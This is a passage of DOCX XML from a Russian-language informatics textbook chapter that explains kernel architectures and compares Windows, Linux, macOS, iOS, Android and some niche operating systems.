        <w:t>Если один модуль (например, драйвер) крашится — падает всё ядро (Blue Screen of Death).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложность отладки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Linux** — монолитное ядро, но с поддержкой модулей (можно загружать драйверы динамически).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**FreeBSD, OpenBSD**.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Размер ядра Linux:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> около 30 миллионов строк кода (2025). Да, это монстр.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Микроядро (Microkernel)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Минимальное ядро, которое содержит только самое необходимое: управление процессами, межпроцессное взаимодействие (IPC), базовое управление памятью. Всё остальное (драйверы, файловые системы) работает в пользовательском режиме как отдельные процессы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Надёжность: если драйвер крашится — он просто перезапускается, ядро остаётся стабильным.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Безопасность: минимальная атакуемая поверхность.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модульность: легко добавлять/удалять компоненты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медленнее: много переключений между пользовательским и привилегированным режимами.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложность реализации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Minix** — академическая ОС, создана для обучения.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**QNX** — коммерческая RTOS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**L4** — семейство микроядер для встраиваемых систем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Забавный факт:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Intel Management Engine (IME) — секретный процессор внутри каждого чипа Intel — работает на Minix. То есть микроскопическая копия Minix работает на твоём компьютере прямо сейчас, и ты даже не знаешь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Гибридное ядро (Hybrid Kernel)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Компромисс между монолитным и микроядром. Основные компоненты (управление памятью, процессами) в ядре, но некоторые драйверы могут работать в пользовательском режиме.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows NT** (Windows 10, 11, Server) — гибридное ядро.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**macOS** (XNU ядро, основано на Mach microkernel + FreeBSD).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Критика:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> некоторые считают, что "гибридное ядро" — это просто маркетинговый термин для "монолитного ядра с элементами микроядра".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>По количеству пользователей и задач</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Однопользовательские / Многопользовательские:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Однопользовательские: MS-DOS, ранние версии Windows (95, 98).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Многопользовательские: Linux, Windows (современные версии), macOS.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Однозадачные / Многозадачные:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Однозадачные: MS-DOS (можно запустить только одну программу).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Многозадачные: все современные ОС.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1.3. Примеры операционных систем</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Разберём основных игроков на рынке ОС.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Windows</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>История:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1985: Windows 1.0 (графическая оболочка поверх MS-DOS).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1995: Windows 95 — первая ОС с полноценным GUI и кнопкой "Пуск".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2001: Windows XP — легендарная версия, которую использовали до 2014 года (а в России до сих пор встречается).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2015: Windows 10 — "последняя версия Windows" (спойлер: нет).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2021: Windows 11 — новый дизайн, поддержка Android-приложений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Архитектура ядра:** гибридное (NT kernel).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Файловая система:** NTFS (по умолчанию).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Доля рынка:** ~70% десктопов (2025).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Применение:** игры, офис, корпоративный сектор.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Огромный выбор программ и игр.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка любого железа (драйверы для всего).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Привычный интерфейс.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Частые обновления, которые ломают систему.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Телеметрия (Microsoft собирает данные о тебе).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вирусы (самая популярная ОС = самая популярная цель для хакеров).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример задачи:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Windows 11 требует минимум: CPU 1 GHz (2 ядра), 4 GB ОЗУ, 64 GB диска, TPM 2.0 (модуль доверенной платформы для безопасности). Твой старый ноутбук 2015 года не поддерживает TPM 2.0 — Windows 11 не установится (хотя есть обходные пути).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Linux</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>История:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1991: Линус Торвальдс (студент из Финляндии) написал ядро Linux как хобби-проект.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1993: первые дистрибутивы (Slackware, Debian).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2000-е: взрывной рост, Linux захватывает серверный рынок.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2020-е: Linux на десктопах растёт (Steam Deck, игры через Proton).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дистрибутивы (Distributions):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Linux — это только ядро. Дистрибутив = ядро + набор программ + пакетный менеджер + окружение рабочего стола.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Дистрибутив   | Сложность   | Применение                        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---------------|-------------|-----------------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ubuntu</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">        | Лёгкий      | Новички, десктоп, серверы         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Debian</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">        | Средний     | Серверы, стабильность             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Arch Linux</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">    | Хардкор     | Гики, кастомизация (i use arch btw) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Fedora</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">        | Средний     | Разработчики, новые технологии    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CentOS / Rocky</w:t>
      </w:r>
      <w:r>
        <w:t>| Средний     | Серверы (замена Red Hat)          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Linux Mint</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">    | Лёгкий      | Переход с Windows, дружелюбность  |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Архитектура ядра:** монолитное (с модулями).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Файловая система:** ext4 (обычно).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Доля рынка:** ~3% десктопов, **96% серверов**, 70% смартфонов (Android).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Применение:** серверы, разработка, встраиваемые системы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бесплатно и open-source.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Настраиваемость (можешь изменить всё, вплоть до ядра).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Безопасность (меньше вирусов).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Стабильность (серверы работают годами без перезагрузки).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кривая обучения (особенно Arch).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Меньше программ и игр (хотя ситуация улучшается).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проблемы с драйверами (особенно NVIDIA).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фрагментация (тысячи дистрибутивов, сложно выбрать).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Философия Linux:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> "Всё есть файл". Даже устройства представлены как файлы в `/dev/`. Хочешь прочитать данные с диска? Читай файл `/dev/sda`. Хочешь отправить данные на принтер? Пиши в `/dev/lp0`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Создал веб-сервер на Ubuntu Server (4 GB RAM, 2 ядра CPU). Установил nginx, настроил за 10 минут. Сервер работает месяцами без перезагрузки. На Windows Server пришлось бы покупать лицензию ($1000+) и мучиться с IIS.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>macOS</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>История:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1984: Mac OS (графическая ОС для компьютеров Apple Macintosh).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2001: Mac OS X — переход на UNIX-основу (ядро XNU = Mach + FreeBSD).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2020: переход с Intel на собственные процессоры Apple Silicon (M1, M2, M3).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Архитектура ядра:** гибридное (XNU).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Файловая система:** APFS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Доля рынка:** ~15% десктопов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Применение:** дизайн, видеомонтаж, разработка под iOS.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Красивый и удобный интерфейс.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оптимизация под железо Apple (интеграция с iPhone, iPad, Apple Watch).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Стабильность (UNIX-основа).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Меньше вирусов, чем на Windows.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Работает только на Mac (цены от $1000).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Закрытая экосистема (не апгрейдишь железо, не установишь на другой компьютер).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Меньше игр.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> MacBook Air M2 (2024) на ARM-процессоре потребляет 5-10 Вт в режиме работы, работает 15-20 часов от батареи. Ноутбук на Intel с такой же производительностью жрал бы 40-50 Вт и работал 5 часов. Секрет: macOS оптимизирована под Apple Silicon, контролирует каждый аспект железа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>iOS и Android</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>iOS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Apple):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Закрытая ОС, основана на Darwin (UNIX).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Жёсткий контроль: приложения только из App Store, Apple проверяет каждое.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оптимизация под iPhone/iPad.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обновления выходят одновременно для всех устройств (даже 5-летним iPhone).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Android</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Google):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Открытая ОС, основана на ядре Linux.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Свобода: можно ставить приложения из сторонних источников, кастомизировать всё.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фрагментация: тысячи производителей (Samsung, Xiaomi, Huawei), разные версии Android.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обновления приходят поздно (или не приходят вообще).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сравнение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Параметр           | iOS                | Android            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------------------|--------------------|--------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Доля рынка         | 28%                | 70%                |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Открытость         | Закрыта            | Открыта (AOSP)     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Безопасность       | Высокая            | Средняя            |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Выбор устройств    | Только iPhone/iPad | Тысячи моделей     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Обновления         | 5+ лет             | 2-3 года (зависит) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Цена устройств     | $400-$1600         | $100-$1500         |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> iPhone 15 Pro (iOS 17) получает обновления безопасности одновременно с выходом патча. У Android-смартфона Xiaomi (2022 года) патч безопасности может выйти через 3 месяца (или никогда). Фрагментация Android — это боль.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Экзотические ОС</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**FreeBSD / OpenBSD**: UNIX-системы, популярны на серверах (Netflix использует FreeBSD для стриминга).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Haiku OS**: попытка воскресить BeOS (ОС 1990-х, известную скоростью).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TempleOS**: ОС, написанная одним человеком (Terry Davis) как "дар Богу". 640x480 разрешение, 16 цветов, встроенный язык программирования HolyC. Безумие и гениальность одновременно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1.4. Связь с другими главами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 2.1-2.3 (Архитектура ЭВМ, принципы фон Неймана):** ОС управляет процессором, памятью, устройствами ввода-вывода, о которых мы говорили в разделе 2.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главы 3.2-3.3 (Уровни ПО, системное ПО):** ОС — это базовый уровень системного ПО, над которым работают драйверы, утилиты, приложения.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
